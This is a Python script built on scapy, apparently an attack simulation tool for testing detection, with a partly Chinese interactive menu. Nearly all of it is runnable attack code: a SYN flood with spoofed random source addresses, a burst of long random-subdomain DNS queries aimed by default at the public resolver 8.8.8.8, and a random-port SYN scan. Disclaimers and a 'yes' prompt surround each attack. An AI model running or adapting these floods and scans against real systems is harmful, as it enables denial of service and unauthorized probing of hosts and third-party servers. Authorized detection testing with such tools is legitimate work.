"""
Attack simulation tool for authorized testing and learning.

⚠️  WARNING: For authorized testing ONLY. Do NOT use against targets
    you do not own or have explicit permission to test.

Provides:
  1. SYN Flood  — TCP SYN with spoofed source IPs
  2. DNS Tunnel — high-frequency long-domain DNS queries

Uses scapy for raw packet generation.
"""

import sys
import os
import time
import random
import string
import signal

from scapy.all import (
    IP, TCP, UDP, DNS, DNSQR, Ether,
    RandShort, send, conf,
)

# ─── globals ────────────────────────────────────────────────────────

_stats = {"sent": 0, "start": 0.0}
_running = True


def _handle_sigint(sig, frame):
    global _running
    _running = False


signal.signal(signal.SIGINT, _handle_sigint)


# ─── attacker 1: SYN Flood ──────────────────────────────────────────

def syn_flood(target_ip, target_port=80, pps=100, duration=10):
    """Send TCP SYN packets with randomised source IPs.

    Args:
        target_ip:   Victim IP address.
        target_port: Victim port (default 80).
        pps:         Packets per second.
        duration:    Attack duration in seconds.
    """
    global _stats, _running
    _running = True
    _stats = {"sent": 0, "start": time.time()}

    print(f"\n{'='*50}")
    print(f"  SYN Flood Attack Simulation")
    print(f"{'='*50}")
    print(f"  Target:  {target_ip}:{target_port}")
    print(f"  Rate:    {pps} pps")
    print(f"  Duration:{duration}s")
    print(f"{'='*50}")

    confirm = input("  Type 'yes' to proceed: ").strip().lower()
    if confirm != "yes":
        print("  Aborted.")
        return

    print(f"\n[*] Starting SYN flood -> {target_ip}:{target_port}")
    conf.verb = 0  # suppress scapy output
    interval = 1.0 / pps if pps > 0 else 0.01
    last_report = time.time()

    try:
        while _running and (time.time() - _stats["start"]) < duration:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}." \
                     f"{random.randint(0,255)}.{random.randint(1,254)}"
            src_port = RandShort()
            pkt = IP(src=src_ip, dst=target_ip) / TCP(
                sport=src_port, dport=target_port, flags="S")
            try:
                send(pkt, verbose=0)
                _stats["sent"] += 1
            except Exception:
                pass

            elapsed_now = time.time()
            if elapsed_now - last_report >= 2.0:
                rate = _stats["sent"] / (elapsed_now - _stats["start"])
                print(f"  [~] {_stats['sent']} pkts sent, "
                      f"rate={rate:.0f} pps")
                last_report = elapsed_now

            time.sleep(max(interval, 0.001))
    except KeyboardInterrupt:
        pass

    total = _stats["sent"]
    elapsed = time.time() - _stats["start"]
    print(f"\n[+] SYN Flood finished: {total} packets in {elapsed:.1f}s "
          f"({total/elapsed:.0f} pps)")


# ─── attacker 2: DNS Tunnel ─────────────────────────────────────────

def dns_tunnel_sim(target_dns="8.8.8.8", duration=30, domain_length=50):
    """Simulate DNS tunnelling with long random domain queries.

    Args:
        target_dns:    DNS server IP (default 8.8.8.8).
        duration:      Simulation duration in seconds.
        domain_length: Random part length before ".tunnel.test".
    """
    global _stats, _running
    _running = True
    _stats = {"sent": 0, "start": time.time()}

    print(f"\n{'='*50}")
    print(f"  DNS Tunnel Simulation")
    print(f"{'='*50}")
    print(f"  DNS Server:   {target_dns}")
    print(f"  Domain length:{domain_length}")
    print(f"  Duration:     {duration}s")
    print(f"{'='*50}")

    confirm = input("  Type 'yes' to proceed: ").strip().lower()
    if confirm != "yes":
        print("  Aborted.")
        return

    print(f"\n[*] Starting DNS tunnel -> {target_dns}")
    conf.verb = 0
    last_report = time.time()

    try:
        while _running and (time.time() - _stats["start"]) < duration:
            rand_part = ''.join(
                random.choices(string.ascii_lowercase, k=domain_length))
            query = f"{rand_part}.tunnel.test"
            pkt = IP(dst=target_dns) / UDP(dport=53) / DNS(
                rd=1, qd=DNSQR(qname=query))
            try:
                send(pkt, verbose=0)
                _stats["sent"] += 1
            except Exception:
                pass

            elapsed_now = time.time()
            if elapsed_now - last_report >= 5.0:
                print(f"  [~] {_stats['sent']} DNS queries sent")
                last_report = elapsed_now

            time.sleep(random.uniform(0.1, 0.5))
    except KeyboardInterrupt:
        pass

    total = _stats["sent"]
    elapsed = time.time() - _stats["start"]
    print(f"\n[+] DNS Tunnel finished: {total} queries in {elapsed:.1f}s")


# ─── port scan attacker ─────────────────────────────────────────────

def port_scan(target_ip, port_range=(1, 1024), pps=50, duration=10):
    """Simulate a horizontal port scan.

    Args:
        target_ip:  Target IP.
        port_range: (start, end) port tuple.
        pps:        Packets per second.
        duration:   Scan duration in seconds.
    """
    global _stats, _running
    _running = True
    _stats = {"sent": 0, "start": time.time()}

    print(f"\n{'='*50}")
    print(f"  Port Scan Simulation")
    print(f"{'='*50}")
    print(f"  Target:  {target_ip}")
    print(f"  Ports:   {port_range[0]}-{port_range[1]}")
    print(f"  Rate:    {pps} pps")
    print(f"  Duration:{duration}s")
    print(f"{'='*50}")

    confirm = input("  Type 'yes' to proceed: ").strip().lower()
    if confirm != "yes":
        print("  Aborted.")
        return

    print(f"\n[*] Starting port scan -> {target_ip}")
    conf.verb = 0
    interval = 1.0 / pps if pps > 0 else 0.01
    last_report = time.time()

    try:
        while _running and (time.time() - _stats["start"]) < duration:
            port = random.randint(port_range[0], port_range[1])
            pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
            try:
                send(pkt, verbose=0)
                _stats["sent"] += 1
            except Exception:
                pass

            elapsed_now = time.time()
            if elapsed_now - last_report >= 2.0:
                rate = _stats["sent"] / (elapsed_now - _stats["start"])
                print(f"  [~] {_stats['sent']} probes sent, "
                      f"rate={rate:.0f} pps")
                last_report = elapsed_now

            time.sleep(max(interval, 0.001))
    except KeyboardInterrupt:
        pass

    total = _stats["sent"]
    elapsed = time.time() - _stats["start"]
    print(f"\n[+] Port Scan finished: {total} probes in {elapsed:.1f}s "
          f"({total/elapsed:.0f} pps)")


# ─── menu ────────────────────────────────────────────────────────────

def main():
    print("\n⚠️  本工具仅用于授权测试和学习目的，请勿对未授权的目标使用。\n")

    while True:
        print(f"\n{'='*40}")
        print("  攻击模拟工具")
        print(f"{'='*40}")
        print("  1. SYN Flood 攻击")
        print("  2. DNS 隧道模拟")
        print("  3. Port Scan 扫描")
        print("  4. 退出")
        print(f"{'='*40}")

        choice = input("请选择 [1-4]: ").strip()

        if choice == "1":
            ip = input("  目标 IP [127.0.0.1]: ").strip() or "127.0.0.1"
            port = input("  目标端口 [80]: ").strip() or "80"
            pps = input("  发包速率 pps [100]: ").strip() or "100"
            dur = input("  持续时间 秒 [10]: ").strip() or "10"
            syn_flood(ip, int(port), int(pps), int(dur))

        elif choice == "2":
            dns = input("  DNS 服务器 [8.8.8.8]: ").strip() or "8.8.8.8"
            dur = input("  持续时间 秒 [30]: ").strip() or "30"
            dlen = input("  域名长度 [50]: ").strip() or "50"
            dns_tunnel_sim(dns, int(dur), int(dlen))

        elif choice == "3":
            ip = input("  目标 IP [127.0.0.1]: ").strip() or "127.0.0.1"
            pps = input("  发包速率 pps [50]: ").strip() or "50"
            dur = input("  持续时间 秒 [10]: ").strip() or "10"
            port_scan(ip, (1, 1024), int(pps), int(dur))

        elif choice == "4":
            print("  Bye.")
            break
        else:
            print("  Invalid choice.")


if __name__ == "__main__":
    main()
